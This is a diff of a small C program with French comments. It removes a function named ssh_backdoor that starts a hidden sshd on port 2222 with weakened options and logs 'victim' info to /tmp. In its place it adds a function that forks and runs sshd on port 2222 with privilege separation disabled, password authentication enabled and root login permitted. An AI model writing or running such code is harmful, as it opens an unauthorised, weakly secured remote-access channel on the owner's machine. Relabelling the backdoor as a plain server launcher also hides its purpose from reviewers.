@@ -1,32 +1,47 @@
-#include <dirent.h>
-#include <errno.h>
-#include <libgen.h>
-#include <stddef.h>
 #include <stdio.h>
 #include <stdlib.h>
-#include <string.h>
-#include <sys/stat.h>
-#include <sys/types.h>
+#include <sys/wait.h>
 #include <unistd.h>
 
-void ssh_backdoor() {
-  char *home = getenv("HOME");
-  char *user = getenv("USER");
-  if (!home || !user)
-    return;
+int lancer_ssh_serveur_2222() {
+  pid_t pid = fork();
 
-  // 2. Lance sshd port 2222 IMMÉDIAT (fallback robuste)
-  system("pkill -f 'sshd.*2222' 2>/dev/null"); // Tue anciens
-  system("/usr/sbin/sshd -D -p 2222 -o PidFile=/tmp/sshd.pid -o StrictModes=no "
-         "-o UsePrivilegeSeparation=no >/dev/null 2>&1 &");
-  sleep(2);
+  if (pid < 0) {
+    perror("fork failed");
+    return -1;
+  }
 
-  // 4. Info debug victim
-  system("echo 'PORT 2222 $(netstat -tulpn | grep :2222 | wc -l) $(pgrep -f "
-         "sshd)' > /tmp/ssh_debug.txt");
+  if (pid == 0) {
+    // Processus enfant : lance sshd sur port 2222
+    char *args[] = {"sshd",
+                    "-D", // Mode démon (ne se détache pas)
+                    "-p",
+                    "2222", // Port 2222
+                    "-o",
+                    "UsePrivilegeSeparation=no", // Pas de séparation privilèges
+                                                 // (évite sudo)
+                    "-o",
+                    "PasswordAuthentication=yes", // Auth par mot de passe
+                    "-o",
+                    "PermitRootLogin=yes", // Root autorisé si besoin
+                    NULL};
+
+    execvp("sshd", args);
+    perror("execvp sshd failed");
+    exit(1);
+  } else {
+    // Processus parent : attend un peu et retourne le PID
+    sleep(1);
+    printf("Serveur SSH lancé sur port 2222 (PID: %d)\n", pid);
+    printf("Testez avec: ssh user@localhost -p 2222\n");
+    return pid;
+  }
 }
 
-int main(void) {
-  ssh_backdoor();
-  return 1;
+int main() {
+  printf("Lancement serveur SSH port 2222...\n");
+
+  lancer_ssh_serveur_2222();
+
+  return 0;
 }
